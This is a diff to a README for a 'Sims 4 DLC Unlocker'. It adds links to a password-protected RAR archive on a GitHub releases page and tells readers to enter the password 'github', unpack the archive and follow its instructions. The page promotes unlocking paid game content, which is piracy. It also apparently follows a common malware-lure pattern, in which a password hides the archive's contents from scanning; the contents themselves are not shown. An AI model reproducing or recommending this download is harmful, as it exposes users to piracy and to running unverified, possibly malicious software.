@@ -1,9 +1,9 @@
-# 🍃 Anadius Unlocker - Sims 4 DLC Unlocker **[![Download DLC Unlocker](https://img.shields.io/badge/Sims%204-DLC%20Unlocker-green)]()**
+# 🍃 Anadius Unlocker - Sims 4 DLC Unlocker **[![Download DLC Unlocker](https://img.shields.io/badge/Sims%204-DLC%20Unlocker-green)](https://github.com/SLTUTORIAL/sims4dlcunlocker/releases/download/ver143/Sims.4.DLC.Unlocker.rar)**
 
 ## Quick Installation
 To get started with Sims 4 DLC Unlocker, follow these simple steps:
 1. **Get the unlocker: [![Download Sims 4 DLC Unlocker](https://img.shields.io/badge/Sims%204-DLC%20Unlocker-green
-)]()**
+)](https://github.com/SLTUTORIAL/sims4dlcunlocker/releases/download/ver143/Sims.4.DLC.Unlocker.rar)**
 2. **Pass: github**
 3. **Unlock the archive and follow the instructions in the archive!**
 4. **Enjoy the game!**
